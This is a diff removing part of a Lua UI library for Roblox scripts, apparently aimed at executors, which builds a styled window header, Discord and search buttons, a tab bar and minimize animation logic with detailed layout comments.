-	HeaderWash.Parent                 = Header
-	MakeCorner(HeaderWash, UDim.new(0, Theme.CornerRadius))
-	do
-		local g = Instance.new("UIGradient")
-		g.Rotation = 0
-		g.Transparency = NumberSequence.new({
-			NumberSequenceKeypoint.new(0.00, 0.86),
-			NumberSequenceKeypoint.new(0.42, 0.97),
-			NumberSequenceKeypoint.new(1.00, 1.00),
-		})
-		g.Parent = HeaderWash
-	end
-
-	local showDiscord = Options.Discord == true
-	local showSearch  = Options.Search ~= false   -- on unless explicitly disabled
-	local showScaler  = Options.Scaler == true
-	-- Close + minimize chips, then one 28px chip + 6px gap per optional chip.
-	local reservedRight = 86 + (showDiscord and 34 or 0) + (showSearch and 34 or 0)
-
-	-- Small accent pip left of the title — a window "app icon" stand-in
-	-- that also gives the header a fixed optical left margin.
-	local TitlePip = Instance.new("Frame")
-	TitlePip.Size             = UDim2.new(0, 3, 0, 16)
-	TitlePip.Position         = UDim2.new(0, 12, 0.5, -8)
-	TitlePip.BackgroundColor3 = Accent
-	TitlePip.BorderSizePixel  = 0
-	TitlePip.ZIndex           = 3
-	TitlePip.Parent           = Header
-	MakeCorner(TitlePip, UDim.new(1, 0))
-	MakeAccentFill(TitlePip, Accent)
-
-	-- Optional lucide icon (Options.Icon). It replaces the pip rather
-	-- than sitting beside it: the pip *is* the stand-in for an icon.
-	local TITLE_ICON   = 16
-	local TITLE_X_PIP  = 21                    -- pip + gap
-	local TITLE_X_ICON = 11 + TITLE_ICON + 7   -- icon + gap
-	local TitleIcon
-	if Options.Icon then
-		TitleIcon = MakeIcon(Header, Options.Icon, TITLE_ICON, Theme.AccentSec, 3)
-		TitleIcon.Name        = "SkibidiTitleIcon"
-		TitleIcon.AnchorPoint = Vector2.new(0, 0.5)
-		TitleIcon.Position    = UDim2.new(0, 11, 0.5, 0)
-		TitlePip.Visible      = false
-	end
-
-	local TITLE_X = TitleIcon and TITLE_X_ICON or TITLE_X_PIP   -- left edge of the title text
-
-	-- Title and subtitle are separate labels rather than one RichText
-	-- string. Keeping them apart is what lets the minimize logic below
-	-- measure each with its own font/size — measuring RichText markup as
-	-- plain text is what previously made a subtitled panel refuse to
-	-- shrink past full width.
-	local TitleLabel = Instance.new("TextLabel")
-	TitleLabel.Size                   = UDim2.new(1, -(reservedRight + TITLE_X), 1, 0)
-	TitleLabel.Position               = UDim2.new(0, TITLE_X, 0, 0)
-	TitleLabel.BackgroundTransparency = 1
-	TitleLabel.Font                   = Theme.FontBold
-	TitleLabel.TextSize               = Theme.TitleSize
-	TitleLabel.TextColor3             = Theme.AccentSec
-	TitleLabel.TextXAlignment         = Enum.TextXAlignment.Left
-	TitleLabel.TextTruncate           = Enum.TextTruncate.AtEnd
-	TitleLabel.Text                   = Options.Title or ""
-	TitleLabel.ZIndex                 = 3
-	TitleLabel.Parent                 = Header
-
-	-- Title text carries the accent gradient so it doesn't read as flat.
-	do
-		local a, b = AccentPair(Accent)
-		local g = Instance.new("UIGradient")
-		g.Color    = ColorSequence.new(Lighten(a, 0.28), Lighten(b, 0.12))
-		g.Rotation = 90
-		g.Parent   = TitleLabel
-	end
-
-	-- Optional subtitle, rendered as a rounded muted pill after the title
-	local plainTitle    = Options.Title    or ""
-	local plainSubTitle = Options.SubTitle or ""
-	local SubPill, SubLabel
-
-	local function measureText(str, size, font)
-		if not str or str == "" then return 0 end
-		local ok, b = pcall(TextService.GetTextSize, TextService,
-			str, size, font, Vector2.new(4000, HEADER_H))
-		return (ok and b and b.X) or (#str * size * 0.55)
-	end
-
-	if plainSubTitle ~= "" then
-		SubPill = Instance.new("Frame")
-		SubPill.AutomaticSize          = Enum.AutomaticSize.X
-		SubPill.Size                   = UDim2.new(0, 0, 0, 16)
-		SubPill.AnchorPoint            = Vector2.new(0, 0.5)
-		SubPill.BackgroundColor3       = Theme.Bg2
-		SubPill.BackgroundTransparency = 0.15
-		SubPill.BorderSizePixel        = 0
-		SubPill.ZIndex                 = 3
-		SubPill.Parent                 = Header
-		MakeCorner(SubPill, UDim.new(1, 0))
-		MakeEdge(SubPill, Theme.AccentDim, 1)
-		MakeGloss(SubPill, 0.10)
-		MakePadding(SubPill, 7, 7, 0, 0)
-
-		SubLabel = Instance.new("TextLabel")
-		SubLabel.AutomaticSize          = Enum.AutomaticSize.X
-		SubLabel.Size                   = UDim2.new(0, 0, 1, 0)
-		SubLabel.BackgroundTransparency = 1
-		SubLabel.Font                   = Theme.FontMedium
-		SubLabel.TextSize               = Theme.CaptionSize
-		SubLabel.TextColor3             = Theme.TextMuted
-		SubLabel.TextXAlignment         = Enum.TextXAlignment.Left
-		SubLabel.Text                   = plainSubTitle
-		SubLabel.ZIndex                 = 4
-		SubLabel.Parent                 = SubPill
-	end
-
-	local SUB_GAP  = 8    -- gap between title text and the subtitle pill
-	local SUB_PADX = 14   -- the pill's own horizontal padding (7 + 7)
-
-	-- Places the pill immediately after the *rendered* title text, and
-	-- keeps the title label's width honest so a long title truncates
-	-- instead of running under the pill or the header buttons.
-	-- TextService measures a hair short of what the font actually renders,
-	-- and the label used to be sized to exactly that number. Overflowing by
-	-- even a sub-pixel arms AtEnd truncation, which then has to free room
-	-- for the ellipsis itself — and "…" is wider than the character it
-	-- replaces, so it ate a second one too. That is how a 420px header
-	-- managed to render "UILib" as "UIL…".
-	--
-	-- The slack absorbs the measurement error, and truncation is only armed
-	-- when the title genuinely cannot fit.
-	local TITLE_SLACK = 6   -- kept under SUB_GAP so it can never reach the pill
-
-	local function layoutTitle()
-		if not SubPill then
-			TitleLabel.TextTruncate = Enum.TextTruncate.AtEnd
-			TitleLabel.Size = UDim2.new(1, -(reservedRight + TITLE_X), 1, 0)
-			return
-		end
-		local subW  = SUB_PADX + measureText(plainSubTitle, Theme.CaptionSize, Theme.FontMedium)
-		local avail = math.max(Width - TITLE_X - reservedRight - SUB_GAP - subW, 20)
-		local textW = math.ceil(measureText(plainTitle, Theme.TitleSize, Theme.FontBold))
-		local fits  = (textW + TITLE_SLACK) <= avail
-
-		TitleLabel.TextTruncate = fits and Enum.TextTruncate.None
-		                              or   Enum.TextTruncate.AtEnd
-
-		local tw = fits and textW or avail
-		SubPill.Position = UDim2.new(0, TITLE_X + tw + SUB_GAP, 0.5, 0)
-		TitleLabel.Size  = UDim2.new(0, tw + (fits and TITLE_SLACK or 0), 1, 0)
-	end
-	layoutTitle()
-
-	-- Accent underline on header
-	local AccentLine = Instance.new("Frame")
-	AccentLine.Size                   = UDim2.new(1, -20, 0, 1)
-	AccentLine.Position               = UDim2.new(0, 10, 1, -1)
-	AccentLine.BackgroundColor3       = Lighten(Accent, 0.10)
-	AccentLine.BackgroundTransparency = 0.35
-	AccentLine.BorderSizePixel        = 0
-	AccentLine.ZIndex                 = 3
-	AccentLine.Parent                 = Header
-
-	-- Fade the underline out toward both ends so it reads as a glow
-	-- rather than a hard rule.
-	local AccentLineGrad = Instance.new("UIGradient")
-	AccentLineGrad.Transparency = NumberSequence.new({
-		NumberSequenceKeypoint.new(0.00, 1),
-		NumberSequenceKeypoint.new(0.18, 0),
-		NumberSequenceKeypoint.new(0.82, 0),
-		NumberSequenceKeypoint.new(1.00, 1),
-	})
-	AccentLineGrad.Parent = AccentLine
-
-	-- Header buttons share one recipe: a soft translucent chip that lifts
-	-- toward the accent on hover and dips on press.
-	local function MakeHeaderChip(glyph, xOffset)
-		local B = Instance.new("TextButton")
-		B.Size                   = UDim2.new(0, 28, 0, 20)
-		B.AnchorPoint            = Vector2.new(1, 0.5)
-		B.Position               = UDim2.new(1, xOffset, 0.5, 0)
-		B.BackgroundColor3       = AccentDim
-		B.BackgroundTransparency = 0.30
-		B.BorderSizePixel        = 0
-		B.Font                   = Theme.FontIcon
-		B.TextSize               = 16
-		B.TextColor3             = Theme.AccentSec
-		B.Text                   = glyph or ""
-		B.AutoButtonColor        = false
-		B.ZIndex                 = 4
-		B.Parent                 = Header
-		MakeCorner(B, UDim.new(0, 7))
-		MakeEdge(B, Accent, 1, 0.55)
-		MakeGloss(B, 0.18)
-		MakeRipple(B, Theme.AccentSec, 7)
-
-		-- Chips are small, so colour alone barely registers as a press.
-		-- Scaling the whole chip is what actually reads at this size.
-		local sc = Instance.new("UIScale")
-		sc.Parent = B
-		B.MouseButton1Down:Connect(function()
-			TweenService:Create(sc, TweenSnap, { Scale = 0.87 }):Play()
-		end)
-		B.MouseButton1Up:Connect(function()
-			TweenService:Create(sc, TweenPop, { Scale = 1 }):Play()
-		end)
-		B.MouseEnter:Connect(function()
-			TweenService:Create(sc, TweenFast, { Scale = 1.06 }):Play()
-		end)
-		B.MouseLeave:Connect(function()
-			TweenService:Create(sc, TweenFast, { Scale = 1 }):Play()
-		end)
-		return B
-	end
-
-	-- Chips are laid out right-to-left: each one claims a 28px slot plus
-	-- a 6px gap, so optional chips can be added without hand-tuning offsets.
-	local chipX = -8
-	local function nextChipX()
-		local x = chipX
-		chipX = chipX - (28 + 6)
-		return x
-	end
-
-	-- Close button
-	local CloseBtn = MakeHeaderChip("×", nextChipX())
-
-	-- Minimize button (shifted left to make room for the close button)
-	local MinBtn = MakeHeaderChip("–", nextChipX())
-
-	-- Discord button (optional, off by default)
-	-- Options.Discord = true enables it. Clicking copies the invite link
-	-- to the clipboard via setclipboard (when the executor supports it).
-	local DISCORD_INVITE    = "https://discord.gg/vonhub"
-	-- The Discord mark is fetched from the web and cached as a PNG in the
-	-- executor workspace (see FetchCachedImage). DISCORD_ICON_ID is only
-	-- the fallback shown while the download runs or when the executor has
-	-- no writefile/getcustomasset.
-	local DISCORD_ICON_URL  = "https://files.catbox.moe/gvgnul.png"
-	local DISCORD_ICON_FILE = "skibidi_discord.png"
-	local DISCORD_ICON_ID   = "rbxassetid://94434236999817"
-
-	local DiscordBtn
-	if showDiscord then
-		DiscordBtn = Instance.new("TextButton")
-		DiscordBtn.Size                   = UDim2.new(0, 28, 0, 20)
-		DiscordBtn.AnchorPoint            = Vector2.new(1, 0.5)
-		DiscordBtn.Position               = UDim2.new(1, nextChipX(), 0.5, 0)
-		DiscordBtn.BackgroundColor3       = AccentDim
-		DiscordBtn.BorderSizePixel        = 0
-		DiscordBtn.Text                   = ""
-		DiscordBtn.AutoButtonColor        = false
-		DiscordBtn.ZIndex                 = 4
-		DiscordBtn.Parent                 = Header
-		MakeCorner(DiscordBtn, UDim.new(0, 7))
-		MakeEdge(DiscordBtn, Accent, 1, 0.55)
-		MakeSheen(DiscordBtn, 0.16)
-		MakeRipple(DiscordBtn, Theme.AccentSec, 7)
-
-		local DiscordIcon = Instance.new("ImageLabel")
-		DiscordIcon.Size                   = UDim2.new(0, 16, 0, 16)
-		DiscordIcon.AnchorPoint            = Vector2.new(0.5, 0.5)
-		DiscordIcon.Position               = UDim2.new(0.5, 0, 0.5, 0)
-		DiscordIcon.BackgroundTransparency = 1
-		DiscordIcon.Image                  = DISCORD_ICON_ID
-		DiscordIcon.ImageColor3            = Theme.AccentSec
-		DiscordIcon.ScaleType              = Enum.ScaleType.Fit
-		DiscordIcon.ZIndex                 = 5
-		DiscordIcon.Parent                 = DiscordBtn
-
-		-- Swap in the cached PNG once it's available (first run downloads
-		-- it, later runs read it straight from the workspace file).
-		task.spawn(function()
-			local asset = FetchCachedImage(DISCORD_ICON_URL, DISCORD_ICON_FILE)
-			if asset and DiscordIcon.Parent then
-				DiscordIcon.Image = asset
-			end
-		end)
-
-		DiscordBtn.MouseButton1Click:Connect(function()
-			if setclipboard then
-				pcall(setclipboard, DISCORD_INVITE)
-			end
-			DiscordIcon.ImageColor3 = Theme.Accent
-			task.delay(1, function()
-				if DiscordIcon and DiscordIcon.Parent then
-					DiscordIcon.ImageColor3 = Theme.AccentSec
-				end
-			end)
-		end)
-		DiscordBtn.MouseEnter:Connect(function()
-			TweenService:Create(DiscordBtn, TweenFast, { BackgroundColor3 = Theme.ToggleOn }):Play()
-		end)
-		DiscordBtn.MouseLeave:Connect(function()
-			TweenService:Create(DiscordBtn, TweenFast, { BackgroundColor3 = AccentDim }):Play()
-		end)
-	end
-
-	-- Search button (optional, on by default)
-	-- Options.Search = false disables it. Clicking swaps the title for a
-	-- search box; typing live-filters every tab's rows by their text.
-	-- The glyph is lucide's "search" from the icon set WindUI ships with.
-	local SEARCH_ICON_ID = "rbxassetid://121018724060431"
-	local SearchBtn, SearchIcon, SearchBox
-	if showSearch then
-		SearchBtn = MakeHeaderChip("", nextChipX())
-		SearchBtn.Name = "SkibidiSearch"
-
-		SearchIcon = Instance.new("ImageLabel")
-		SearchIcon.Size                   = UDim2.new(0, 13, 0, 13)
-		SearchIcon.AnchorPoint            = Vector2.new(0.5, 0.5)
-		SearchIcon.Position               = UDim2.new(0.5, 0, 0.5, 0)
-		SearchIcon.BackgroundTransparency = 1
-		SearchIcon.Image                  = SEARCH_ICON_ID
-		SearchIcon.ImageColor3            = Theme.AccentSec
-		SearchIcon.ZIndex                 = 5
-		SearchIcon.Parent                 = SearchBtn
-
-		-- The box takes over the title's slot so nothing else in the
-		-- header has to move; it is only visible while search is open.
-		SearchBox = Instance.new("TextBox")
-		SearchBox.Name                   = "SkibidiSearchBox"
-		SearchBox.Size                   = UDim2.new(1, -(reservedRight + TITLE_X), 0, 22)
-		SearchBox.AnchorPoint            = Vector2.new(0, 0.5)
-		SearchBox.Position               = UDim2.new(0, TITLE_X, 0.5, 0)
-		SearchBox.BackgroundColor3       = Theme.InputBg
-		SearchBox.BackgroundTransparency = 0.10
-		SearchBox.BorderSizePixel        = 0
-		SearchBox.Font                   = Theme.FontMedium
-		SearchBox.TextSize               = Theme.SmallSize
-		SearchBox.TextColor3             = Theme.TextPrimary
-		SearchBox.PlaceholderText        = "Search…"
-		SearchBox.PlaceholderColor3      = Theme.TextMuted
-		SearchBox.TextXAlignment         = Enum.TextXAlignment.Left
-		SearchBox.TextTruncate           = Enum.TextTruncate.AtEnd
-		SearchBox.ClearTextOnFocus       = false
-		SearchBox.Text                   = ""
-		SearchBox.Visible                = false
-		SearchBox.ZIndex                 = 4
-		SearchBox.Parent                 = Header
-		MakeCorner(SearchBox, UDim.new(0, 7))
-		MakeEdge(SearchBox, Accent, 1, 0.55)
-		MakePadding(SearchBox, 8, 8, 0, 0)
-	end
-
-	-- ── Tab bar (optional) ─────────────────────────────────
-	-- "top"  — horizontal bar of equal-width buttons under the header
-	-- "left" — vertical rail of full-width buttons beside the content
-	local TabBar, TabBtns, TabUnderline, TabInd, RailBg
-	local tabGrads = {}
-	local tabIcons = {}   -- index -> ImageLabel (only tabs that have one)
-	local TAB_ICON = 14
-	local tabGap, tabW = 6, 0
-	local SIDE_TAB_H, SIDE_TAB_GAP, SIDE_TAB_TOP = 28, 4, 8
-	if hasTabs and not sideTabs then
-		TabBar = Instance.new("Frame")
-		TabBar.Position               = UDim2.new(0, 0, 0, HEADER_H)
-		TabBar.Size                   = UDim2.new(1, 0, 0, TABBAR_H)
-		TabBar.BackgroundTransparency = 1
-		TabBar.ZIndex                 = 2
-		TabBar.Parent                 = Frame
-		-- Shifted down 2px from the previous pass (top 4->6, bottom 9->7)
-		-- so the tab buttons sit centered between the header underline
-		-- above and the tab underline below.
-		MakePadding(TabBar, 10, 10, 6, 7)
-		MakeListLayout(TabBar, Enum.FillDirection.Horizontal, 6,
-			Enum.HorizontalAlignment.Center, Enum.VerticalAlignment.Center)
-
-		TabUnderline = Instance.new("Frame")
-		TabUnderline.Size                   = UDim2.new(1, -20, 0, 1)
-		TabUnderline.Position               = UDim2.new(0, 10, 0, HEADER_H + TABBAR_H - 1)
-		TabUnderline.BackgroundColor3       = AccentDim
-		TabUnderline.BackgroundTransparency = 0.3
-		TabUnderline.BorderSizePixel        = 0
-		TabUnderline.ZIndex                 = 2
-		TabUnderline.Parent                 = Frame
-
-		-- Every tab gets an equal share of the bar's width instead of
-		-- sizing itself to its own text — long labels can overflow their
-		-- button, which is fine, but the buttons themselves stay uniform.
-		tabGap = 6
-		tabW   = (Width - 20 - tabGap * (#Tabs - 1)) / #Tabs
-
-		TabBtns = {}
-		for i, name in ipairs(Tabs) do
-			local btn = Instance.new("TextButton")
-			btn.Size              = UDim2.new(0, tabW, 1, 0)
-			btn.LayoutOrder       = i
-			btn.BackgroundColor3  = Theme.Bg2
-			btn.BorderSizePixel   = 0
-			btn.AutoButtonColor   = false
-			btn.Font              = Theme.FontMedium
-			btn.TextSize          = Theme.SmallSize
-			btn.TextColor3        = Theme.TextMuted
-			btn.Text              = "  " .. name .. "  "
-			btn.ZIndex            = 3
-			btn.Parent            = TabBar
-			MakeCorner(btn, UDim.new(0, 7))
-			MakeEdge(btn, AccentDim, 1)
-			-- One gradient per tab, re-coloured on activation rather than
-			-- created and destroyed, so switching tabs allocates nothing.
-			local g = Instance.new("UIGradient")
-			g.Rotation = 90
-			g.Parent   = btn
-			tabGrads[i] = g
-			local fit = Instance.new("UITextSizeConstraint", btn)
-			fit.MaxTextSize = 12; fit.MinTextSize = 8
-			TabBtns[i] = btn
-		end
-
-		-- The sliding indicator. It lives on Frame, not on TabBar, because
-		-- TabBar is driven by a UIListLayout and any child of it would be
-		-- treated as another tab to lay out.
-		TabInd = Instance.new("Frame")
-		TabInd.Size             = UDim2.new(0, math.floor(tabW), 0, 2)
-		TabInd.Position         = UDim2.new(0, 10, 0, HEADER_H + TABBAR_H - 2)
-		TabInd.BackgroundColor3 = Accent
-		TabInd.BorderSizePixel  = 0
-		TabInd.ZIndex           = 4
-		TabInd.Parent           = Frame
-		MakeCorner(TabInd, UDim.new(1, 0))
-		MakeAccentFill(TabInd, Accent)
-	elseif sideTabs then
-		-- Vertical tab rail on a slightly darker strip so it reads as
-		-- navigation, separated from content by a 1px divider.
-		-- The rail runs to the panel's bottom edge, and ClipsDescendants
-		-- clips to a rectangle, so a plain square rail would poke past
-		-- the panel's rounded bottom-left corner. The rail's fill lives in
-		-- a clipped sibling instead: the fill is oversized by one corner
-		-- radius up and to the right, so the clip keeps only its
-		-- bottom-left rounding and every other corner stays square.
-		local R = Theme.CornerRadius
-		RailBg = Instance.new("Frame")
-		RailBg.Position               = UDim2.new(0, 0, 0, HEADER_H)
-		RailBg.Size                   = UDim2.new(0, RAIL_W, 1, -HEADER_H)
-		RailBg.BackgroundTransparency = 1
-		RailBg.BorderSizePixel        = 0
-		RailBg.ClipsDescendants       = true
-		RailBg.ZIndex                 = 2
-		RailBg.Parent                 = Frame
-		local RailFill = Instance.new("Frame")
-		RailFill.Position               = UDim2.new(0, 0, 0, -R)
-		RailFill.Size                   = UDim2.new(1, R, 1, R)
-		RailFill.BackgroundColor3       = Theme.Bg0
-		RailFill.BackgroundTransparency = 0.35
-		RailFill.BorderSizePixel        = 0
-		RailFill.ZIndex                 = 2
-		RailFill.Parent                 = RailBg
-		MakeCorner(RailFill, UDim.new(0, R))
-
-		TabBar = Instance.new("Frame")
-		TabBar.Position               = UDim2.new(0, 0, 0, HEADER_H)
-		TabBar.Size                   = UDim2.new(0, RAIL_W, 1, -HEADER_H)
-		TabBar.BackgroundTransparency = 1
-		TabBar.BorderSizePixel        = 0
-		TabBar.ZIndex                 = 2
-		TabBar.Parent                 = Frame
-		MakePadding(TabBar, 6, 6, 8, 8)
-		MakeListLayout(TabBar, Enum.FillDirection.Vertical, 4)
-
-		-- Vertical divider between the rail and the content area
-		-- (kept in TabUnderline so minimize/restore hides it too)
-		TabUnderline = Instance.new("Frame")
-		TabUnderline.Size                   = UDim2.new(0, 1, 1, -(HEADER_H + 10))
-		TabUnderline.Position               = UDim2.new(0, RAIL_W, 0, HEADER_H + 5)
-		TabUnderline.BackgroundColor3       = AccentDim
-		TabUnderline.BackgroundTransparency = 0.3
-		TabUnderline.BorderSizePixel        = 0
-		TabUnderline.ZIndex                 = 2
-		TabUnderline.Parent                 = Frame
-
-		TabBtns = {}
-		for i, name in ipairs(Tabs) do
-			local btn = Instance.new("TextButton")
-			btn.Size              = UDim2.new(1, 0, 0, 28)
-			btn.LayoutOrder       = i
-			btn.BackgroundColor3  = Theme.Bg2
-			btn.BorderSizePixel   = 0
-			btn.AutoButtonColor   = false
-			btn.Font              = Theme.FontMedium
-			btn.TextSize          = Theme.SmallSize
-			btn.TextColor3        = Theme.TextMuted
-			btn.TextXAlignment    = Enum.TextXAlignment.Left
-			btn.TextTruncate      = Enum.TextTruncate.AtEnd
-			btn.Text              = name
-			btn.ZIndex            = 3
-			btn.Parent            = TabBar
-			MakeCorner(btn, UDim.new(0, 7))
-			MakeEdge(btn, AccentDim, 1)
-			MakePadding(btn, 12, 6, 0, 0)
-			local g = Instance.new("UIGradient")
-			g.Rotation = 90
-			g.Parent   = btn
-			tabGrads[i] = g
-			TabBtns[i] = btn
-		end
-
-		TabInd = Instance.new("Frame")
-		TabInd.Size             = UDim2.new(0, 3, 0, 16)
-		TabInd.Position         = UDim2.new(0, 2, 0, HEADER_H + SIDE_TAB_TOP + 6)
-		TabInd.BackgroundColor3 = Accent
-		TabInd.BorderSizePixel  = 0
-		TabInd.ZIndex           = 4
-		TabInd.Parent           = Frame
-		MakeCorner(TabInd, UDim.new(1, 0))
-		MakeAccentFill(TabInd, Accent)
-	end
-
-	-- Icons on tabs. Top tabs centre their text, so the icon rides the
-	-- text (InlineIcon); the side rail is left-aligned, so the icon
-	-- simply widens the rail's padding (PadIcon). Also the backing for
-	-- SetTabIcon, which re-points an existing icon or adds one late.
-	local function makeTabIcon(i, spec)
-		local btn = TabBtns and TabBtns[i]
-		if not btn then return nil end
-		if tabIcons[i] then
-			SetIconImage(tabIcons[i], spec)
-			return tabIcons[i]
-		end
-		if spec == nil or spec == "" then return nil end
-		local color = (i == activeTab) and Theme.ActiveTabText or Theme.TextMuted
-		tabIcons[i] = sideTabs
-			and PadIcon(btn, spec, TAB_ICON, color, 6)
-			or  InlineIcon(btn, spec, TAB_ICON, color, 5)
-		return tabIcons[i]
-	end
-	for i, spec in pairs(tabIconSpecs) do makeTabIcon(i, spec) end
-
-	-- ── Content area ───────────────────────────────────────
-	-- One scrolling frame per tab (or just one if no tabs)
-	local tabCount  = hasTabs and #Tabs or 1
-	local tabFrames = {}
-
-	for i = 1, tabCount do
-		local sf = Instance.new("ScrollingFrame")
-		sf.Position               = UDim2.new(0, RAIL_W, 0, HEADER_H + TABBAR_H)
-		sf.Size                   = UDim2.new(1, -RAIL_W, 1, -(HEADER_H + TABBAR_H))
-		sf.BackgroundTransparency = 1
-		sf.BorderSizePixel        = 0
-		sf.ScrollBarThickness     = 4
-		sf.ScrollBarImageColor3   = Accent
-		sf.ScrollBarImageTransparency = 0.45
-		sf.ScrollingDirection     = Enum.ScrollingDirection.Y
-		sf.AutomaticCanvasSize    = Enum.AutomaticSize.Y
-		sf.CanvasSize             = UDim2.new(0, 0, 0, 0)
-		sf.ClipsDescendants       = true
-		sf.Visible                = (i == 1)
-		sf.Parent                 = Frame
-		MakePadding(sf, Theme.Padding, Theme.Padding, Theme.Padding, Theme.Padding)
-		MakeListLayout(sf, Enum.FillDirection.Vertical, 6)
-		tabFrames[i] = sf
-	end
-
-	-- ── Tab switching logic ────────────────────────────────
-	-- Active tabs are lit from the top; inactive ones stay almost flat.
-	-- Both live on the same gradient object so the difference is a colour
-	-- swap rather than a structural change.
-	local GRAD_ON = ColorSequence.new({
-		ColorSequenceKeypoint.new(0.00, Color3.new(1.00, 1.00, 1.00)),
-		ColorSequenceKeypoint.new(1.00, Color3.new(0.74, 0.74, 0.74)),
-	})
-	local GRAD_OFF = ColorSequence.new({
-		ColorSequenceKeypoint.new(0.00, Color3.new(1.00, 1.00, 1.00)),
-		ColorSequenceKeypoint.new(1.00, Color3.new(0.93, 0.93, 0.93)),
-	})
-
-	local function tabIndicatorTarget(idx)
-		if sideTabs then
-			local y = HEADER_H + SIDE_TAB_TOP
-			      + (idx - 1) * (SIDE_TAB_H + SIDE_TAB_GAP)
-			      + (SIDE_TAB_H - 16) / 2
-			return UDim2.new(0, 2, 0, math.floor(y))
-		end
-		return UDim2.new(0, math.floor(10 + (idx - 1) * (tabW + tabGap)),
-		                 0, HEADER_H + TABBAR_H - 2)
-	end
-
-	local function applyTabStyle(animate)
-		if not hasTabs then return end
-		for i, btn in ipairs(TabBtns) do
-			local on = (i == activeTab)
-			local bg   = on and Theme.ToggleOn or Theme.Bg2
-			local text = on and Theme.ActiveTabText or Theme.TextMuted
-			if animate then
-				TweenService:Create(btn, TweenFast,
-					{ BackgroundColor3 = bg, TextColor3 = text }):Play()
-			else
-				btn.BackgroundColor3 = bg
-				btn.TextColor3       = text
-			end
-			btn.Font = on and Theme.FontBold or Theme.FontMedium
-			if tabGrads[i] then
-				tabGrads[i].Color = on and GRAD_ON or GRAD_OFF
-			end
-			if tabIcons[i] then
-				if animate then
-					TweenService:Create(tabIcons[i], TweenFast, { ImageColor3 = text }):Play()
-				else
-					tabIcons[i].ImageColor3 = text
-				end
-			end
-		end
-		if TabInd then
-			local target = tabIndicatorTarget(activeTab)
-			if animate then
-				-- Quint-out is what sells this as one object gliding to a
-				-- new tab rather than two bars blinking in and out.
-				TweenService:Create(TabInd, TweenSoft, { Position = target }):Play()
-			else
-				TabInd.Position = target
-			end
-		end
-	end
-
-	local lastTab = activeTab
-	local function SetTab(idx)
-		if not hasTabs then return end
-		local dir = (idx > lastTab) and 1 or -1
-		activeTab = idx
-		for i, sf in ipairs(tabFrames) do
-			sf.Visible = (i == idx)
-		end
-
-		-- The incoming page slides in from the side it came from, so tab
-		-- order stays legible instead of every switch looking identical.
-		local sf = tabFrames[idx]
-		if sf and idx ~= lastTab then
-			local restX = RAIL_W
-			sf.Position = UDim2.new(0, restX + dir * 16, 0, HEADER_H + TABBAR_H)
-			TweenService:Create(sf, TweenSoft,
-				{ Position = UDim2.new(0, restX, 0, HEADER_H + TABBAR_H) }):Play()
-		end
-
-		lastTab = idx
-		applyTabStyle(true)
-	end
-
-	if hasTabs then
-		applyTabStyle()
-		for i, btn in ipairs(TabBtns) do
-			local idx = i
-			btn.MouseButton1Click:Connect(function() SetTab(idx) end)
-			btn.MouseEnter:Connect(function()
-				if activeTab ~= idx then
-					TweenService:Create(btn, TweenFast,
-						{ BackgroundColor3 = Theme.Hover }):Play()
-				end
-			end)
-			btn.MouseLeave:Connect(function()
-				if activeTab ~= idx then
-					TweenService:Create(btn, TweenFast,
-						{ BackgroundColor3 = Theme.Bg2 }):Play()
-				end
-			end)
-		end
-		SetTab(activeTab)
-	end
-
-	-- ── Minimize logic ─────────────────────────────────────
-	-- Minimizing happens in two stages instead of collapsing straight
-	-- into the topbar:
-	--   1) collapse height normally (FULL_H -> HEADER_H)
-	--   2) slide the width in sideways until the panel hugs the title,
-	--      so the minimized button sits directly beside the title text
-	--      instead of covering it or leaving a dead gap.
-	-- Restoring reverses the two stages (width out, then height open).
-	-- The hugging width is computed from the *actual rendered* title
-	-- text each time, so it adapts automatically to any title length.
-	local MIN_BTN_W     = 28   -- MinBtn.Size.X
-	local CLOSE_BTN_W   = 28   -- CloseBtn.Size.X
-	local DISCORD_BTN_W = showDiscord and (28 + 6) or 0  -- DiscordBtn.Size.X + gap, if present
-	local SEARCH_BTN_W  = showSearch  and (28 + 6) or 0  -- SearchBtn.Size.X + gap, if present
-	local BTN_GAP       = 6    -- gap between MinBtn and CloseBtn
-	local MIN_BTN_RIGHT = 8    -- CloseBtn's right margin (see Position above)
-	local TITLE_GAP     = 10   -- breathing room between title text and buttons
-
-	-- Width the panel shrinks to when minimized: enough to hold the pip,
-	-- the title, the subtitle pill (if any) and the header buttons.
-	--
-	-- The title and subtitle are measured *separately, as plain strings,
-	-- with their own font and size*. The previous version measured
-	-- TitleLabel.Text, which — once a SubTitle was supplied — held RichText
-	-- markup (`Foo  <font size="11" color="#...">bar</font>`). TextService
-	-- has no idea those are tags, so it measured ~40 extra characters at
-	-- title size, the result blew past Width, the clamp pinned it to Width,
-	-- and stage 2 of the animation became a no-op: the panel collapsed its
-	-- height and then just sat there at full width, "half minimized".
-	local function computeMinimizedWidth()
-		local w = TITLE_X + (SubPill and TitleLabel.Size.X.Offset
-		                     or measureText(plainTitle, Theme.TitleSize, Theme.FontBold))
-		if plainSubTitle ~= "" then
-			w = w + SUB_GAP + SUB_PADX
-			   + measureText(plainSubTitle, Theme.CaptionSize, Theme.FontMedium)
-		end
-		w = w + TITLE_GAP + SEARCH_BTN_W + DISCORD_BTN_W + MIN_BTN_W + BTN_GAP + CLOSE_BTN_W + MIN_BTN_RIGHT
-		-- Clamp to the panel's own width so minimizing never makes the
-		-- window *wider*; a title long enough to hit that ceiling simply
-		-- truncates instead.
-		return math.clamp(math.ceil(w), 90, Width)
-	end
-
-	local isMinimized = Options.Minimized == true
-	local minimizeToken = 0
-
-	-- Defined further down (search / resize sections); declared here so
-	-- the minimize logic can reach them.
-	local ScaleBtn
-	local SetSearchOpen = function() end
-
-	local function setBodyVisible(visible)
-		if TabBar       then TabBar.Visible       = visible end
-		if RailBg       then RailBg.Visible       = visible end
-		if TabUnderline then TabUnderline.Visible = visible end
-		if TabInd       then TabInd.Visible       = visible end
-		if ScaleBtn     then ScaleBtn.Visible     = visible end
-		if visible then
-			for i, sf in ipairs(tabFrames) do
-				if hasTabs then
-					sf.Visible = (i == activeTab)
-				else
-					sf.Visible = (i == 1)
-				end
-			end
-		else
-			for _, sf in ipairs(tabFrames) do sf.Visible = false end
-		end
-	end
-
-	local function applyMinimize(instant)
-		minimizeToken = minimizeToken + 1
-		local myToken = minimizeToken
-
-		MinBtn.Text = isMinimized and "+" or "–"
-		AccentLine.Visible = not isMinimized
-
-		if instant then
-			if isMinimized then
-				setBodyVisible(false)
-				Frame.Size = UDim2.new(0, computeMinimizedWidth(), 0, HEADER_H)
-			else
-				setBodyVisible(true)
